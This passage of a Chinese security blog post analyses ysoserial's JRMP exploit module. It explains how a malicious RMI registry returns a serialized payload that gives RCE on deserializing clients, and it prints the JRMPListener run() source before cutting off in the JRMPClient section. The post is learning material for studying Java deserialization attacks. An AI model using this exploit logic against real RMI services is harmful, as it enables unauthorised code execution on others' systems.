<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言这里去看这个是因为在看weblogic的漏洞时用到了，当时没去学，现在补一下所以记录一下，需要的前置知识 就是RMI执行流程，这个自己前面也记录过，但是还是建议师傅们去看su18的，自己写的有点垃圾，不想看https:&#x2F;&#x2F;su18.org&#x2F;post&#x2F;rmi-attack&#x2F;#%E4%B8%89-%E6%80%BB%E7%BB%93 在贴一下su18师傅的总结。 123456789101. RMI">
<meta property="og:type" content="article">
<meta property="og:title" content="Ysoserial-JRMP模块">
<meta property="og:url" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/index.html">
<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
<meta property="og:description" content="前言这里去看这个是因为在看weblogic的漏洞时用到了，当时没去学，现在补一下所以记录一下，需要的前置知识 就是RMI执行流程，这个自己前面也记录过，但是还是建议师傅们去看su18的，自己写的有点垃圾，不想看https:&#x2F;&#x2F;su18.org&#x2F;post&#x2F;rmi-attack&#x2F;#%E4%B8%89-%E6%80%BB%E7%BB%93 在贴一下su18师傅的总结。 123456789101. RMI">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614125450736.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614125550894.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614125957863.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614130413097.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614131139641.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614132115457.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614132916400.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190826370.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614185548393.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614185834167.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190030449.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190119315.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190643946.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614232648217.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614232827561.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614232903153.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234311221.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234246292.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234655028.png">
<meta property="og:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234911339.png">
<meta property="article:published_time" content="2025-06-14T03:51:18.000Z">
<meta property="article:modified_time" content="2025-06-14T15:53:49.442Z">
<meta property="article:author" content="Oceanzbz">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="JRMP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614125450736.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Ysoserial-JRMP模块</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QWTJSPQL4F');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&text=Ysoserial-JRMP模块"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&is_video=false&description=Ysoserial-JRMP模块"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ysoserial-JRMP模块&body=Check out this article: https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&name=Ysoserial-JRMP模块&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&t=Ysoserial-JRMP模块"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">Exploit模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPListenr"><span class="toc-number">4.1.</span> <span class="toc-text">JRMPListenr</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">4.1.1.</span> <span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPClient"><span class="toc-number">4.2.</span> <span class="toc-text">JRMPClient</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload%E6%A8%A1%E5%9D%97"><span class="toc-number">5.</span> <span class="toc-text">payload模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPListener"><span class="toc-number">5.1.</span> <span class="toc-text">JRMPListener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPClient-1"><span class="toc-number">5.2.</span> <span class="toc-text">JRMPClient</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Ysoserial-JRMP模块
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oceanzbz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-14T03:51:18.000Z" class="dt-published" itemprop="datePublished">2025-06-14</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/JRMP/" rel="tag">JRMP</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里去看这个是因为在看weblogic的漏洞时用到了，当时没去学，现在补一下所以记录一下，需要的前置知识 就是RMI执行流程，这个自己前面也记录过，但是还是建议师傅们去看su18的，自己写的有点垃圾，不想看<br><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93">https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93</a> 在贴一下su18师傅的总结。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. RMI 客户端在调用远程方法时会先创建 Stub ( `sun.rmi.registry.RegistryImpl_Stub` )。</span><br><span class="line">2. Stub 会将 Remote 对象传递给远程引用层 ( `java.rmi.server.RemoteRef` ) 并创建 `java.rmi.server.RemoteCall`( 远程调用 )对象。</span><br><span class="line">3. RemoteCall 序列化 RMI 服务名称、Remote 对象。</span><br><span class="line">4. RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</span><br><span class="line">5. RMI服务端的远程引用层( `sun.rmi.server.UnicastServerRef` )收到请求会请求传递给 Skeleton ( `sun.rmi.registry.RegistryImpl_Skel#dispatch` )。</span><br><span class="line">6. Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</span><br><span class="line">7. Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</span><br><span class="line">8. RMI 客户端反序列化服务端结果，获取远程对象的引用。</span><br><span class="line">9. RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</span><br><span class="line">10. RMI 客户端反序列化 RMI 远程方法调用结果。</span><br></pre></td></tr></table></figure>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JRMP是一个Java远程方法协议，该协议基于TCP&#x2F;IP之上，RMI协议之下。也就是说RMI该协议传递时底层使用的是JRMP协议，而JRMP底层则是基于TCP传递。</p>
<p>RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议其实也是基于RMI去进行实现的。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在之前cc链子分析的时候介绍过怎么搭建Ysoserial工具，需要去下一个源码导入到IDEA中</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614125450736.png" class="">

<p>然后在配置这里配置好参数即可，注意pom.xml中可能会有报错，也就是一些依赖没有下载下来我的解决办法时直接去另一个项目中把这些依赖都下载下来就可以了。</p>
<h2 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a>Exploit模块</h2><h3 id="JRMPListenr"><a href="#JRMPListenr" class="headerlink" title="JRMPListenr"></a>JRMPListenr</h3><img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614125550894.png" class="">

<p>运行之后就会弹出计算器，其实原理就是起一个恶意的注册中心，在客户端获取时返回一个恶意的序列化数据，客户端反序列化触发RCE。</p>
<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>在ysoserial端打上断点看看是如何生成并发送的</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614125957863.png" class="">

<p>这里会将端口和payload传入<code>JRMPListener</code>实例化然后调用run方法，那具体看看<code>JRMPListener</code>是如何定义的</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614130413097.png" class="">

<p>这里其实没什么好看的就是把paylaod和端口传进来初始化了而已，去看看run方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span> <span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 循环等待客户端连接</span></span><br><span class="line">            <span class="keyword">while</span> ( !<span class="built_in">this</span>.exit &amp;&amp; ( s = <span class="built_in">this</span>.ss.accept() ) != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    s.setSoTimeout(<span class="number">5000</span>);</span><br><span class="line">                    <span class="comment">// 获取客户端的远程地址</span></span><br><span class="line">                    <span class="type">InetSocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();</span><br><span class="line">                    System.err.println(<span class="string">&quot;Have connection from &quot;</span> + remote);</span><br><span class="line">                    <span class="comment">// 获取与客户端连接的输入流</span></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">                    <span class="comment">// 根据标志位，选择使用原始输入流还是BufferedInputStream</span></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">bufIn</span> <span class="operator">=</span> is.markSupported() ? is : <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Read magic (or HTTP wrapper)</span></span><br><span class="line">                    bufIn.mark(<span class="number">4</span>);</span><br><span class="line">                    <span class="comment">// 用于从输入流中读取数据</span></span><br><span class="line">                    <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(bufIn);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">magic</span> <span class="operator">=</span> in.readInt();</span><br><span class="line"></span><br><span class="line">                    <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> in.readShort();</span><br><span class="line">                    <span class="comment">// 检查魔数和版本号是否匹配预期值，如果不匹配则关闭连接并继续下一次循环</span></span><br><span class="line">                    <span class="keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 获取与客户端连接的输出流</span></span><br><span class="line">                    <span class="type">OutputStream</span> <span class="variable">sockOut</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">                    <span class="type">BufferedOutputStream</span> <span class="variable">bufOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(sockOut);</span><br><span class="line">                    <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(bufOut);</span><br><span class="line">                    <span class="comment">// 从输入流中读取一个字节，表示协议类型</span></span><br><span class="line">                    <span class="type">byte</span> <span class="variable">protocol</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">                    <span class="keyword">switch</span> ( protocol ) &#123;</span><br><span class="line">                    <span class="comment">// 流协议</span></span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.StreamProtocol:</span><br><span class="line">                        <span class="comment">// 向输出流写入一个字节作为协议确认</span></span><br><span class="line">                        out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line">                        <span class="comment">// 向输出流写入客户端主机名</span></span><br><span class="line">                        <span class="keyword">if</span> ( remote.getHostName() != <span class="literal">null</span> ) &#123;</span><br><span class="line">                            out.writeUTF(remote.getHostName());</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            out.writeUTF(remote.getAddress().toString());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 向输出流写入客户端的端口</span></span><br><span class="line">                        out.writeInt(remote.getPort());</span><br><span class="line">                        out.flush();</span><br><span class="line">                        in.readUTF();</span><br><span class="line">                        in.readInt();</span><br><span class="line">                    <span class="comment">// 单操作协议</span></span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.SingleOpProtocol:</span><br><span class="line">                        <span class="comment">// 调用此方法处理客户端请求，这里传入了payload</span></span><br><span class="line">                        <span class="comment">// 进入的是这里</span></span><br><span class="line">                        doMessage(s, in, out, <span class="built_in">this</span>.payloadObject);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                    <span class="comment">// 多路复用协议</span></span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.MultiplexProtocol:</span><br><span class="line">                        System.err.println(<span class="string">&quot;Unsupported protocol&quot;</span>);</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    bufOut.flush();</span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( InterruptedException e ) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">                    e.printStackTrace(System.err);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span> &#123;</span><br><span class="line">                    System.err.println(<span class="string">&quot;Closing connection&quot;</span>);</span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s != <span class="literal">null</span> ) &#123;</span><br><span class="line">                s.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">this</span>.ss != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ss.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( SocketException e ) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会进入 <code>doMessage</code> 方法</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614131139641.png" class="">

<p>继续走到doCall方法中</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614132115457.png" class="">

<p>最终会通过反射将恶意的payload写入输出流返回给客户端造成RCE。返回看客户端的断点</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614132916400.png" class="">

<p>这里会接收从恶意注册端返回的数据进行反序列化，这里的2其实就是恶意注册端设置的<code>TransportConstants.ExceptionalReturn</code></p>
<h3 id="JRMPClient"><a href="#JRMPClient" class="headerlink" title="JRMPClient"></a>JRMPClient</h3><img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190826370.png" class="">


<p>他是用来主动攻击我们开启的DGC服务端的,看一下主要逻辑是<code>makeDGCCall</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 